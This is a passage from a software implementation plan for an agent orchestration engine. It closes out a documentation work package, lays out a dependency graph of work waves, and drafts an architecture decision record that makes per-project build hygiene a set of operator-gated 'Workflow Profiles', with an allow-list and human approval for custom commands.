4. Only after all of step 3 is green is the work deliverable. **Opus QA sign-off alone is NOT
   delivery — E2E must follow it** (operator requirement).

### WP-25 — docs + ADR closure
**Tier:** haiku · **Depends:** WP-24 green
**Files:** EDIT `docs/ARCHITECTURE.md` (new "Workflow Profiles" section: 3 layers, precedence,
gating, blocked_on_approval), EDIT `CLAUDE.md` (migration counter 0021→0022 note + one-line
pointer to the profile system), file superseding ADR text for ADR-BUILD-001 via the dashboard
flow (draft the text; operator approves).
**Checklist:** [ ] ARCHITECTURE section written · [ ] CLAUDE.md "latest is 0022; next: 0023" ·
[ ] ADR draft delivered in the WP report

---

## Dependency graph (waves)

```
A1: WP-01  WP-02  WP-03  WP-04  WP-05          (parallel, disjoint files)
A2: WP-06  WP-07                                → GATE A
B:  WP-08 → WP-09 ∥ WP-10                       → GATE B
C1: WP-11 ∥ WP-16 ∥ WP-17
C2: WP-12 → WP-13 ∥ WP-15   (WP-22, WP-23 may run here too)   → GATE C
D:  WP-18 ∥ WP-19 → WP-20                       → GATE D
E:  WP-21 ∥ (WP-22, WP-23 if not done) → WP-24 → WP-25
```

---

## Appendix: ADR draft (for operator approval on /adrs)

This is **draft text only** — WP-25 does not write to the database. An operator
files it via the dashboard `/adrs` proposal flow (or `adr propose`/equivalent
CLI), reviewing/editing as they see fit before approval. It is written to
**supersede ADR-BUILD-001** ("Verify and dev worktrees must reconcile
node_modules to the lockfile before typecheck"), which described one
hardcoded, npm-specific instance of a problem this ADR generalizes and gates.

```
domain: BUILD
title: Executable per-project hygiene is expressed as gated Workflow Profiles
supersedes: ADR-BUILD-001

decision:
  Stack-specific, executable worktree hygiene (dependency reconcile, codegen,
  service readiness, verify commands, cleanup) is declared as a per-project
  Workflow Profile, never hardcoded into engine core. A profile is composed
  from three layers in precedence order — engine defaults, the product repo's
  `.orchestrator/workflow.yaml` (request-only), and the operator-owned
  workspace manifest (authority) — and the workspace manifest always wins.
  Every required action is gated: built-in adapter actions and actions
  sourced from the engine defaults or the workspace manifest are trusted by
  identity/provenance; any other custom command requires an exact-match (or
  sha256-pinned) grant in the workspace manifest's `permissions.allow` list.
  An unauthorized action never runs silently and never fails the verify gate
  outright — it escalates asynchronously (`blocked_on_approval`, a
  pending-actions queue, and a dashboard approval card) and the state machine
  treats it as not-yet-attempted until a human approves, denies, or lets it
  expire. This supersedes ADR-BUILD-001: the node_modules/lockfile reconcile
  it described is now one instance of the node stack adapter's `prepare` step
  under this general mechanism, not a standalone rule.

context:
  ADR-BUILD-001 was filed after the tendcharting fleet wedged on stale
  node_modules in QA verify worktrees (2026-07-14) — a real fix, but encoded
  as npm-specific logic inside project-agnostic engine core, and with no
  generalized gating story for the executable actions the harness runs on an
  operator's behalf. The Workflow Profile system (this repo's
  `orchestrator/workflow/` package; see `docs/ARCHITECTURE.md` §9 and
  `WORKFLOW-PROFILE-IMPLEMENTATION-PLAN.md`) generalizes the fix: any stack
  (node and python shipped with full adapters; go adapter is a stub pending
  further work; rust is auto-detected but lacks an adapter yet) can declare
  its own hygiene steps, and no action — however it is sourced — can grant
  itself execution rights on the host. The security posture is deliberate:
  the engine runs actions as the agent OS user with no sandbox beyond `cwd`,
  so authority for what may run must live only with the operator (the
  workspace manifest), never with whoever has commit rights to the product
  repo.
```

